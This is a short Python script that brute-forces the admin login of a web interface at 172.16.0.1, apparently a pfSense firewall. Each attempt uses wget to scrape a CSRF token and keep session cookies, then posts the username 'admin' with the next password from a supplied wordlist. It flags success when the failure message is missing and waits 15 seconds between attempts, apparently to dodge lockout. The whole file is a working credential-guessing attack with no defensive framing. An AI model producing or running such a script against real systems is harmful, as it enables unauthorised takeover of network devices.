#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Yanis Alim

import sys
import subprocess
import time
cmd1 = """wget -qO- --keep-session-cookies --save-cookies cookies.txt --no-check-certificate https://172.16.0.1/index.php | grep "name='__csrf_magic'" | sed 's/.*value="\\(.*\\)".*/\\1/' > csrf.txt"""
cmd2 = """wget -qO- --keep-session-cookies --load-cookies cookies.txt  --save-cookies cookies.txt --no-check-certificate --post-data "login=Login&usernamefld=admin&passwordfld={}&__csrf_magic=$(cat csrf.txt)" https://172.16.0.1/index.php"""

if len(sys.argv) != 2 :
    print("Usage: {} 'wordlist'".format(sys.argv[0]))
    sys.exit(1)

passwords = [ x.strip(' \t\n') for x in  open(sys.argv[1], 'r', encoding="ISO-8859-1").readlines() ]
passwords = passwords[13:]
for password in passwords : 
    out = subprocess.getoutput(cmd1)
    out = subprocess.getoutput(cmd2.format(password))
    if not "Username or Password incorrect" in out :
        print("[*] Found password : {}".format(password))
    else :
        print("[!] Trying: {}".format(password))
    time.sleep(15)
